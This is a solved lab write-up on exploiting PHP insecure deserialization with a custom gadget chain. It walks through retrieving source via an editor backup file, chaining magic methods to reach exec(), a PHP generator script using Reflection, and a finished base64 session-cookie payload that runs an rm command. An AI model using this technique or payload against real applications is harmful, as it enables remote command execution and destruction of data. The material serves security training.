# Developing a Custom Gadget Chain for PHP Deserialization

**Difficulty:** Expert

**Category:** Insecure Deserialization / PHP Deserialization / Custom Gadget Chain

**Status:** Solved ✅



## Overview



This lab uses a serialized PHP session cookie.




The application unserializes attacker-controlled data, allowing us to construct a **custom gadget chain** from classes already present in 
the application.



The goal is to delete:



```text

/home/carlos/morale.txt

```



The important part of this lab is learning how to identify and connect existing PHP magic methods until attacker-controlled data reaches a 
dangerous function.



---



## 1. Discovering the Source Code



The lab hint suggested trying a tilde (`~`) at the end of a filename to retrieve an editor-generated backup file.



We requested:



```http

GET /cgi-bin/libs/CustomTemplate.php~ HTTP/2

```



The server returned the source code.



---



## 2. Relevant Classes


The source contained:



```php

class CustomTemplate

class Product

class Description

class DefaultMap

```



The important classes for the exploit were:



```text


CustomTemplate

Product

DefaultMap

```



---



## 3. Starting the Gadget Chain



`CustomTemplate` contains:



```php

public function __wakeup() {


    $this->build_product();

}



```



When the application unserializes a `CustomTemplate` object, PHP automatically invokes:



```php
__wakeup()

```

This calls:



```php

$this->build_product();

```



---



## 4. `build_product()`



The method is:



```php

private function build_product() {

    $this->product = new Product($this->default_desc_type, $this->desc);

}

```



Therefore, `Product` receives two attacker-controlled object properties:



```text

default_desc_type

desc

```



---



## 5. The `Product` Gadget



The constructor contains:



```php

public function __construct($default_desc_type, $desc) {

    $this->desc = $desc->$default_desc_type;

}

```



The important expression is:



```php

$desc->$default_desc_type

```


We can make `$desc` a `DefaultMap` object.



If the requested property does not exist, PHP invokes the object's:



```php

__get()


```



magic method.



---


## 6. `DefaultMap::__get()`




The relevant code is:



```php

public function __get($name) {

    return call_user_func($this->callback, $name);

}

```



This gives us a controllable callback.



If:



```text

callback = "exec"

```



then:



```php

call_user_func("exec", $name);
```



effectively becomes:


```php

exec($name);

```



---



## 7. Building the Gadget Chain



We therefore construct the object so that:


```text
default_desc_type = "rm /home/carlos/morale.txt"

desc = DefaultMap object

DefaultMap.callback = "exec"

```



The complete chain becomes:



```text

unserialize()
    ↓

CustomTemplate::__wakeup()


    ↓

CustomTemplate::build_product()

    ↓

new Product($default_desc_type, $desc)

    ↓

$desc->$default_desc_type

    ↓

DefaultMap::__get($name)

    ↓

call_user_func("exec", $name)

    ↓

exec("rm /home/carlos/morale.txt")

```




---


## 8. Generating the Serialized Object



Instead of manually calculating PHP serialization lengths, we used PHP's own `serialize()` function.



The generator script:


```php

<?php



class CustomTemplate {

    private $default_desc_type;

    private $desc;


    public $product;

}



class DefaultMap {


    private $callback;


    public function __construct($callback) {


        $this->callback = $callback;

    }

}



$map = new DefaultMap("exec");



$template = new CustomTemplate();



$ref = new ReflectionClass("CustomTemplate");




$prop = $ref->getProperty("default_desc_type");

$prop->setAccessible(true);

$prop->setValue($template, "rm /home/carlos/morale.txt");




$prop = $ref->getProperty("desc");

$prop->setAccessible(true);

$prop->setValue($template, $map);



echo base64_encode(serialize($template));



```



Run:


```bash


php /tmp/generate.php

```



---



## 9. Why Reflection Was Needed


`CustomTemplate` defines:



```php

private $default_desc_type;

private $desc;

```



These are private properties.




We used PHP Reflection to modify them:



```php

$ref = new ReflectionClass("CustomTemplate");

```


Then:




```php
$ref->getProperty("default_desc_type");


$ref->getProperty("desc");


```


and:


```php
$prop->setAccessible(true);

```




This allowed us to set the values required for the gadget chain.



---



## 10. Final Object Structure


The object we generated was effectively:



```text

CustomTemplate

├── default_desc_type = "rm /home/carlos/morale.txt"
└── desc

    └── DefaultMap

        └── callback = "exec"

```



---



## 11. Final Base64 Payload


The generated payload was:




```text
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjM6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6

IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo0OiJleGVjIjt9czo3OiJwcm9kdWN0IjtOO30=


```


We placed it in:



```http

Cookie: session=PAYLOAD

```



---



## 12. Result

The application unserialized the malicious object and followed the gadget chain.



The final command executed was:


```text

rm /home/carlos/morale.txt


```


The lab was successfully solved. ✅



---

## 13. Key Takeaways




### 1. Look for magic methods




Important PHP deserialization methods include:




```php

__wakeup()

__sleep()

__get()
__set()

__destruct()

__toString()


```


They can automatically execute when specific operations occur.



### 2. Trace data flow

The important question is not only:




> "Is there an unserialize()?"



We also need to trace:




```text

Attacker-controlled serialized data

        ↓

Object properties


        ↓

Magic methods

        ↓

Application functionality

        ↓

Dangerous function
```



### 3. Existing functionality can become a gadget


The application did not explicitly contain a function named "deserialization exploit".

Instead, we chained normal application behavior:


```text

__wakeup()

    ↓


build_product()

    ↓

Product constructor

    ↓
dynamic property access
    ↓

__get()

    ↓
call_user_func()
    ↓


exec()
```




### Key Concept



> A custom gadget chain is a sequence of existing classes and methods that can be connected so attacker-controlled data eventually reaches 
a dangerous operation.

